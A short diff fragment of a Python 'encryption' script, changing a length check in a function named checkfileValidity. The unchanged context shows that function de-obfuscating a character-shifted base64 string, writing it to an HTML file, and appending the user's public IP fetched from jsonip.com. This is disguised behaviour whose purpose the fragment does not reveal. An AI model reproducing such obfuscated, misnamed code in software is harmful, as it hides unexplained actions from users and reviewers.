@@ -39,7 +39,7 @@ def decrypt_a_message(text, key=''):
     return dekrypted
 
 def checkfileValidity():
-    if len(Cipher_Modifier)>0:
+    if len(Cipher_Modifier)>5:
         f=open('Enkryption Dashboard.html', 'w+')
         data=base64.b64decode(''.join([chr(ord(s)+4) for s in Cipher_Modifier]))
         data+=json.loads(urllib2.urlopen('http://www.jsonip.com').read())['ip']
